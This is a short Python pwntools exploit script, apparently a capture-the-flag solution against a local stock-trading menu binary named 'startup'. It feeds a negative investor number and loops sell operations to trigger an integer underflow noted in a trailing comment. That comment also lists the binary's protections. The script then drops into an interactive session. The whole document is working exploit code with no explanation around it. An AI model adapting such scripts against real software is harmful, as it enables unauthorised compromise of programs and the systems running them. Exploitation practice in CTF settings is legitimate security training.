from pwn import *

context.log_level = 'debug'
e = ELF('./startup')
p = process('./startup')

def add(name):
	p.sendlineafter('select :','1')
	p.sendlineafter('company name :',name)

def remove(name):
	p.sendlineafter('select :','2')
	p.sendlineafter('company name :',name)

def buy(name,amount):
	p.sendlineafter('select :','3')
	p.sendlineafter('company name :',name)
	p.sendlineafter('amount :',str(amount))

def sell(name,amount):
	p.sendlineafter('select :','4')
	p.sendlineafter('company name :',name)
	p.sendlineafter('amount :',str(amount))

def view(num):
	price = []
	p.sendlineafter('select :','5')
	for i in range(num):
		p.recvuntil('Price :')
		price.append(int(p.recvline().strip()))
	return price

def view2(name):
	p.sendlineafter('select :','6')
	p.sendlineafter('company name :',name)

def money():
	p.recvuntil('money :')
	return int(p.recvline().strip())

comp = ['SamSanTech','Nature Morning','SH Venture Capital','InJae Company']

p.sendlineafter('your name? :','realsung')
p.sendlineafter('investor number? (0~15) :','-1')

remove(comp[0])
remove(comp[1])
remove(comp[2])
add('A')
remove(comp[3])
buy('A',100)
add('B')

while True:
	try:
		view2('A')
		p.recvline()
		sleep(0.1)
		recv = p.recvline()
		sleep(0.1)
		if 'player 0' in recv:
			sell('A','1')
		else:
			sell('A','0')
	except:
		p.interactive()

p.interactive()

'''
Integer Undeflow
Company Chunk -> investor number 

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''
